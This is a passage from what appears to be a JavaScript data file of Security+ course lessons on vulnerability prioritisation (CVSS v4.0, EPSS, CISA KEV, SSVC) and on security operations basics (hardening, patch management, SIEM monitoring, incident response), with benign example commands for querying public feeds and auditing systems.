    "Explain what EPSS measures and how it differs from CVSS",
    "Use the CISA KEV catalog and BOD 22-01 deadlines",
    "Combine severity, exploitation likelihood and asset context into a prioritization decision"
  ],
  html: `<p>If you patch "all critical and high CVSS findings first", you will be working on thousands of items — most of which will never be exploited — while attackers use a handful of others. Modern prioritization combines <b>severity</b> (CVSS), <b>likelihood of exploitation</b> (EPSS), <b>evidence of exploitation</b> (KEV) and <b>your context</b> (asset criticality and exposure).</p>

<h3>CVSS v4.0</h3>
<p>The Common Vulnerability Scoring System, maintained by FIRST, was updated to <b>version 4.0 in November 2023</b>. Many tools and databases still show CVSS 3.1 scores alongside v4.0, so you must read both. v4.0 has four metric groups:</p>
<table>
<tr><th>Group</th><th>Metrics</th><th>Who sets it</th></tr>
<tr><td><b>Base</b></td><td>Exploitability: Attack Vector (AV: N/A/L/P), Attack Complexity (AC), <b>Attack Requirements</b> (AT, new), Privileges Required (PR), User Interaction (UI: None/<b>Passive</b>/<b>Active</b>). Impact on the <b>vulnerable system</b> (VC, VI, VA) and on <b>subsequent systems</b> (SC, SI, SA)</td><td>Vendor/NVD</td></tr>
<tr><td><b>Threat</b></td><td>Exploit Maturity (E): Attacked / POC / Unreported</td><td>Consumer, from threat intel</td></tr>
<tr><td><b>Environmental</b></td><td>Security requirements (CR, IR, AR) and modified base metrics for your environment</td><td>Consumer (you)</td></tr>
<tr><td><b>Supplemental</b></td><td>Safety, Automatable, Recovery, Value Density, Vulnerability Response Effort, Provider Urgency — informative, do not change the score</td><td>Vendor/consumer</td></tr>
</table>
<p>Key changes from v3.1: the confusing <b>Scope</b> metric is gone (replaced by separate vulnerable/subsequent system impacts), User Interaction is more granular, the Temporal group became the simpler Threat group, and naming makes clear which groups were used: <b>CVSS-B</b> (base only), <b>CVSS-BT</b>, <b>CVSS-BE</b>, <b>CVSS-BTE</b>. FIRST stresses that a Base score alone is a measure of <i>severity</i>, not <i>risk</i>.</p>
<h4>Reading a vector</h4>
<pre><code>CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N   -&gt; 9.3 Critical
  AV:N   exploitable over the network
  AC:L   low complexity
  AT:N   no special conditions needed
  PR:N   no privileges needed
  UI:N   no user interaction
  VC/VI/VA:H  high confidentiality, integrity, availability impact on the vulnerable system
  SC/SI/SA:N  no impact on subsequent systems</code></pre>
<table>
<tr><th>Rating</th><th>Score</th></tr>
<tr><td>None</td><td>0.0</td></tr>
<tr><td>Low</td><td>0.1 – 3.9</td></tr>
<tr><td>Medium</td><td>4.0 – 6.9</td></tr>
<tr><td>High</td><td>7.0 – 8.9</td></tr>
<tr><td>Critical</td><td>9.0 – 10.0</td></tr>
</table>

<h3>EPSS: how likely is exploitation?</h3>
<p>The <b>Exploit Prediction Scoring System</b>, also from FIRST, uses machine learning on real-world exploitation data to estimate the <b>probability (0–1) that a CVE will be exploited in the wild in the next 30 days</b>, updated daily. EPSS v4 was released in March 2025. It also gives a <b>percentile</b> relative to all other CVEs. Most CVEs have very low EPSS scores; a small fraction carry most of the risk.</p>
<pre><code>$ curl -s "https://api.first.org/data/v1/epss?cve=CVE-2021-44228"
{"data":[{"cve":"CVE-2021-44228","epss":"0.94...","percentile":"0.99...","date":"..."}]}</code></pre>
<p>CVSS answers "how bad if exploited?"; EPSS answers "how likely to be exploited soon?". They are complementary.</p>

<h3>CISA KEV: known exploited</h3>
<p>CISA's <b>Known Exploited Vulnerabilities (KEV) catalog</b> lists CVEs with reliable evidence of active exploitation, a clear remediation and a due date. Under <b>Binding Operational Directive 22-01</b> (2021), U.S. federal civilian agencies must remediate KEV entries by the due date listed for each one (usually two to three weeks after it is added), but every organization can use it as a "patch this now" list. It holds well over a thousand entries, with new ones added most weeks, and flags those known to be used in ransomware campaigns. It is free to download as CSV/JSON.</p>
<pre><code>$ curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json \\
   | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['count'], 'KEV entries')"</code></pre>

<h3>SSVC: a decision tree</h3>
<p><b>Stakeholder-Specific Vulnerability Categorization</b> (developed by Carnegie Mellon's SEI and adopted by CISA) replaces a number with a decision: <b>Track</b>, <b>Track*</b>, <b>Attend</b> or <b>Act</b>, based on exploitation status, whether exploitation is automatable, technical impact and mission/well-being impact.</p>

<h3>Putting it together</h3>
<table>
<tr><th>Finding</th><th>CVSS</th><th>EPSS</th><th>KEV</th><th>Asset</th><th>Decision</th></tr>
<tr><td>A</td><td>9.8 (v3.1)</td><td>0.002</td><td>No</td><td>Internal test server</td><td>Normal patch cycle (30 days)</td></tr>
<tr><td>B</td><td>7.2</td><td>0.89</td><td><b>Yes</b></td><td>Internet-facing VPN</td><td><b>Emergency</b> — patch/mitigate within 24–72 h, hunt for compromise</td></tr>
<tr><td>C</td><td>8.1</td><td>0.35</td><td>No</td><td>Payment database</td><td>High priority (7–14 days); add compensating controls</td></tr>
<tr><td>D</td><td>5.3</td><td>0.01</td><td>No</td><td>Kiosk, isolated</td><td>Track; fix in routine maintenance</td></tr>
</table>
<p>Finding B outranks A despite a lower CVSS score: it is being exploited, it is internet-facing, and edge devices are where intrusions start. When a KEV-listed flaw on an exposed system was unpatched for any period, patching is not enough — <b>assume compromise and hunt</b> for indicators.</p>
<div class="callout tip">A practical policy many organizations adopt: (1) KEV or high EPSS on internet-facing assets → emergency; (2) KEV anywhere → within the BOD 22-01 timeline; (3) Critical/High CVSS with high asset criticality → 7–30 days; (4) everything else → routine cycle with risk-accepted exceptions documented.</div>
<div class="callout real"><b>On the job:</b> you will often be asked "are we affected by the vulnerability in the news?" The workflow: identify the CVE and affected versions, query your scanner/EDR inventory, check KEV/EPSS and vendor guidance, list exposed instances, open tickets with owners, and track to closure. Speed and accuracy here build your reputation fast.</div>
<div class="callout exam"><b>Exam mapping:</b> Security+ SY0-701 objective 4.3 lists CVSS, CVE, vulnerability classification, exposure factor, environmental variables, industry/organizational impact and risk tolerance. The exam is based on CVSS concepts generally; know the severity bands and that environmental context changes priority.</div>`,
  keyTerms: [
    ["CVSS v4.0", "FIRST's 2023 scoring system with Base, Threat, Environmental and Supplemental groups"],
    ["Attack Requirements (AT)", "CVSS v4.0 base metric for deployment conditions needed for exploitation"],
    ["CVSS-BTE", "Nomenclature showing Base, Threat and Environmental metrics were used"],
    ["EPSS", "Probability a CVE will be exploited in the wild in the next 30 days"],
    ["KEV catalog", "CISA list of vulnerabilities known to be actively exploited"],
    ["BOD 22-01", "CISA directive requiring federal agencies to remediate KEV entries by due dates"],
    ["SSVC", "Decision-tree prioritization: Track, Track*, Attend, Act"],
    ["Exploit maturity", "CVSS v4.0 threat metric: Attacked, POC or Unreported"],
    ["Asset criticality", "Business importance of a system, used to adjust priority"]
  ],
  standards: ["FIRST CVSS v4.0 Specification", "FIRST EPSS", "CISA BOD 22-01", "CISA SSVC"],
  labs: ["lab-cvss"]
},
{
  id: "p1-m6-l3",
  module: "p1-m6",
  title: "Security Operations Basics: Hardening, Patching, Monitoring and Incident Response",
  minutes: 22,
  objectives: [
    "Apply secure baselines (CIS Benchmarks, STIGs) and hardening techniques",
    "Describe an effective patch and asset management process",
    "Explain logging, SIEM, alert tuning and key SOC metrics",
    "Outline the incident response lifecycle per NIST SP 800-61 Rev. 3"
  ],
  html: `<p>Security operations is the daily work of keeping systems in a secure state, watching for trouble and responding when it happens. This lesson ties Phase 1 together and sets up Phase 2, where you will work inside a SOC.</p>

<h3>Secure baselines and hardening</h3>
<p>A <b>secure baseline</b> is a documented, approved configuration for a system type. Instead of inventing settings, organizations adopt published benchmarks:</p>
<ul>
<li><b>CIS Benchmarks</b> — consensus hardening guides for operating systems, cloud platforms, browsers, databases and more, with Level 1 (practical) and Level 2 (high-security) profiles.</li>
<li><b>DISA STIGs</b> — U.S. Department of Defense Security Technical Implementation Guides.</li>
<li><b>Microsoft Security Baselines</b> — Group Policy/Intune baselines for Windows, Edge and Microsoft 365.</li>
</ul>
<p>The baseline lifecycle is <b>establish → deploy → maintain</b>: apply via Group Policy, Intune, Ansible or cloud policies; then detect and correct <b>configuration drift</b> continuously. Typical hardening steps: remove unneeded software and services, close unused ports, change default credentials, enable host firewall and EDR, enforce disk encryption, restrict admin rights, enable logging, and keep firmware current. Mobile devices, IoT, ICS/SCADA, embedded systems and cloud workloads each need their own baselines.</p>
<pre><code># Linux: check for listening services you don't need, then disable one
$ sudo ss -tulpn
$ sudo systemctl disable --now cups
# Windows: audit current audit policy and local password settings
C:\\&gt; auditpol /get /category:*
C:\\&gt; net accounts</code></pre>

<h3>Asset and patch management</h3>
<p>Everything starts with <b>asset inventory</b>: hardware, software, cloud resources, owners and data classification. Assets move through a lifecycle — acquisition/procurement, assignment and accounting (ownership, classification), monitoring, and finally <b>disposal</b> with sanitization (NIST SP 800-88: clear, purge or destroy) and a certificate of destruction.</p>
<p>A sound <b>patch management</b> process:</p>
<ol>
<li>Monitor vendor releases (e.g. Microsoft's monthly Patch Tuesday, out-of-band emergency fixes, Linux distribution advisories).</li>
<li>Prioritize with the methods from the previous lesson.</li>
<li>Test on a pilot group; have a rollback plan (change management, p1-m1).</li>
<li>Deploy in rings (pilot → broad → critical servers) with automation (Intune/WSUS, Configuration Manager, Ansible, cloud patch managers).</li>
<li>Verify with scans and report compliance.</li>
</ol>
<p><b>End-of-life</b> systems no longer receive patches — Windows 10 reached end of support on 14 October 2025 (Extended Security Updates are available for a fee). Isolate or replace EOL systems, and track them as risks.</p>

<h3>Monitoring, logging and the SIEM</h3>
<p>Monitoring turns events into decisions. Key log sources: identity (AD, Entra ID, Okta), endpoints (EDR, Sysmon, Windows Security logs), network (firewall, proxy, DNS, NetFlow, IDS), cloud (CloudTrail, Azure Activity, Google Cloud Audit Logs), email, and applications. A <b>SIEM</b> (Splunk, Microsoft Sentinel, Elastic, Google SecOps, QRadar, Wazuh) collects, normalizes and correlates them and raises <b>alerts</b>. <b>SOAR</b> automates response steps; <b>XDR</b> combines endpoint, identity, email and cloud telemetry in one platform.</p>
<p>Core monitoring activities in SY0-701: <b>log aggregation</b>, <b>alerting</b>, <b>scanning</b>, <b>reporting</b>, <b>archiving</b>, and alert response and remediation — <b>quarantine</b> and <b>alert tuning</b>. Tuning matters: a SIEM producing 5,000 low-value alerts a day causes <b>alert fatigue</b> and missed real attacks.</p>
<table>
<tr><th>Metric</th><th>Meaning</th></tr>
<tr><td><b>MTTD</b></td><td>Mean time to detect</td></tr>
<tr><td><b>MTTR</b></td><td>Mean time to respond/recover (or remediate)</td></tr>
<tr><td>Dwell time</td><td>How long an attacker was present before detection</td></tr>
<tr><td>True/false positive rate</td><td>Quality of detections</td></tr>
</table>
<div class="callout tip">Synchronized time (NTP) across every device, and keeping enough log history (often 90 days hot, a year or more archived, depending on regulation), are prerequisites for any investigation.</div>

<h3>Incident response</h3>
<p>NIST published <b>SP 800-61 Revision 3</b> in April 2025, reorganizing incident response guidance around the six <b>NIST CSF 2.0</b> functions — <b>Govern, Identify, Protect, Detect, Respond, Recover</b> — and emphasizing that IR is part of overall risk management, not an isolated team activity. You will still see the classic lifecycle from Rev. 2 and Security+, which remains the best mental model for handling an incident:</p>
<ol>
<li><b>Preparation</b> — plans, playbooks, contacts, tools, training, logging in place.</li>
<li><b>Detection and analysis</b> — triage alerts, determine scope and severity, preserve evidence.</li>
<li><b>Containment</b> — isolate hosts, disable accounts, block indicators (short-term and long-term).</li>
<li><b>Eradication</b> — remove malware and persistence, close the entry point.</li>
<li><b>Recovery</b> — restore from clean backups, monitor closely, return to normal.</li>
<li><b>Lessons learned / post-incident activity</b> — root cause analysis, improve controls and playbooks.</li>
</ol>
<p>Security+ lists the phases as Preparation, Detection, Analysis, Containment, Eradication, Recovery and Lessons learned, plus <b>training</b>, <b>testing</b> (tabletop exercises and simulations), <b>root cause analysis</b>, <b>threat hunting</b> and <b>digital forensics</b> (legal hold, chain of custody, acquisition, preservation, e-discovery).</p>
<div class="callout real"><b>On the job — a Tier 1 analyst's first incident:</b> EDR alerts that <code>winword.exe</code> spawned <code>powershell.exe -enc ...</code> on a finance laptop. You decode the command (a download cradle), check the URL in threat intel (malicious), isolate the host via EDR (containment), find the phishing email and its other recipients, purge it, block the domain, reset the user's credentials and revoke sessions, and escalate to Tier 2 with a clear timeline. Every skill in Phases 0 and 1 just got used.</div>
<div class="callout warn">Don't power off a compromised machine by reflex: you lose memory evidence. Network isolation through EDR usually preserves evidence and stops the spread at the same time. Follow the organization's playbook and preserve chain of custody for anything that may end up in court.</div>
<div class="callout exam"><b>Exam mapping:</b> Security Operations is the largest Security+ SY0-701 domain (Domain 4.0, 28%): 4.1 secure baselines and hardening targets, 4.2 asset management, 4.3 vulnerability management, 4.4 alerting and monitoring (SIEM, SCAP, NetFlow, DLP), 4.8 incident response processes and 4.9 data sources for investigations.</div>`,
  keyTerms: [
    ["Secure baseline", "Approved standard configuration for a system type"],
    ["CIS Benchmarks", "Consensus-based hardening guides from the Center for Internet Security"],
    ["Configuration drift", "Systems gradually deviating from their approved baseline"],
    ["Patch management", "Process to identify, test, deploy and verify software updates"],
    ["SIEM", "Security Information and Event Management: collects, correlates and alerts on logs"],
    ["SOAR", "Security Orchestration, Automation and Response"],
    ["Alert fatigue", "Desensitization caused by excessive low-value alerts"],
    ["MTTD / MTTR", "Mean time to detect / respond (or remediate)"],
    ["Containment", "IR phase limiting an incident's spread and impact"],
    ["Chain of custody", "Documented record of who handled evidence and when"]
  ],
  standards: ["NIST SP 800-61 Rev. 3", "NIST CSF 2.0", "NIST SP 800-40 Rev. 4", "NIST SP 800-88", "NIST SP 800-92", "CIS Benchmarks"],
  labs: ["lab-windows-events", "lab-powershell-triage"]
}
);
